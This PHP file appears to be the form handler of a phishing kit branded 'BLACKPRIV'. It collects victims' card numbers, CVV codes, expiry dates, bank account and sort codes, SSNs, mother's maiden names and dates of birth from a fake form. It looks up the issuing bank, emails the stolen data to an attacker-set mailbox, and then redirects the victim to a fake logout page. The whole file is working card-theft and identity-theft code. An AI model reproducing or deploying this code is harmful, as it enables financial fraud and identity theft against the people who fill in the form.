<?php
include('../../blocker.php');
include('../../detect.php');
$binq     = str_replace(' ', '', $_POST['cc_number']);
$binq     = substr($binq, 0, 6);
$getbank = json_decode(file_get_contents("https://lookup.binlist.net/".$binq.""));
$ccbrand = $getbank->brand;
$cctype = $getbank->type;
$ccklas = $getbank->scheme;
$ccbank = $getbank->bank->name;
$namacountry = $getbank->country->name;
$VictimInfo1 = "| IP Address :"." ".$_SERVER['REMOTE_ADDR']." (".gethostbyaddr($_SERVER['REMOTE_ADDR']).")";
$VictimInfo2 = "| Location :"." ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country'];
$VictimInfo3 = "| UserAgent :"." ".$systemInfo['useragent'];
$VictimInfo4 = "| Browser :"." ".$systemInfo['browser'];
$VictimInfo5 = "| Platform :"." ".$systemInfo['os'];
//+++++++++++++++++++++++++++++++\\ ISI PESAN //+++++++++++++++++++++++++++++++\\
$message ="
++------[ $$ BLACKPRIV $$ ]------++
-- If U Not Have Friend No Problem :) --

      .++=====[ 16 DIGIT ]=====++.
Cardholder Name :  ".$_POST['cc_holder']."
Card Number     :  ".$_POST['cc_number']."
Expiration Date :  ".$_POST['expdate_month']." / ".$_POST['expdate_year']."
Cvv2            :  ".$_POST['cvv2_number']."
BIN/IIN Info    :  ".$ccbank." - ".$cctype." - ".$ccklas."
Sort Code       :  ".$_POST['sort_code1']." - ".$_POST['sort_code2']." - ".$_POST['sort_code3']."
Account number  :  ".$_POST['accnum']."
BSB Number      :  " . $_POST['bsbnum_1'] . " - " . $_POST['bsbnum_2'] . "
OSID Number     :  " . $_POST['osidnum'] . "
Credit Limit    :  " . $_POST['cc_limit'] . "
Mother's name   :  ".$_POST['mmd']."
      .++=========[ End ]=========++.

      .++===[ Address & Info ]===++.
Account Name    :  ".$_POST['full_name']."
First Name      :  ".$_POST['f_name']."
Last Name		:  ".$_POST['l_name']."
Address Line 1  :  ".$_POST['address1']."
Address Line 2  :  ".$_POST['address2']."
City/Town       :  ".$_POST['city']."
State           :  ".$_POST['state']."
Zip/PostCode    :  ".$_POST['postal']."
Country         :  ".$nama_negara."
Phone Number    :  ".$_POST['phone']."
SSN             :  ".$_POST['ssn1']." - ".$_POST['ssn2']." - ".$_POST['ssn3']."
ID Number       :  ".$_POST['id_number']."
DOB             :  ".$_POST['dob_day']." / ".$_POST['dob_month']." / ".$_POST['dob_year']."
      .++=========[ End ]=========++.

      .=========-Info PC-==========.
From            :  ".$ip." On ".date('r')."
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."
      .++=========[ End ]=========++.

.....========-Find-A-True-Friend-=========.....
";
//+++++++++++++++++++++++++++++++\\ ISI PESAN //+++++++++++++++++++++++++++++++\\

include('../../____YourMail____.php');
$subject = $binq." - CreditCard ".$ccbrand." ".$cctype." ".$ccklas." ".$ccbank." [ ".$nama_negara." | $ip ]";
$headers = "From: CreditCard <blackpriv@cc-result.com>";
mail($emailku, $subject, $message, $headers);

header("LOCATION: redirscr?cmd=_logout&session=".md5(microtime())."&dispatch=".sha1(microtime())."");

?>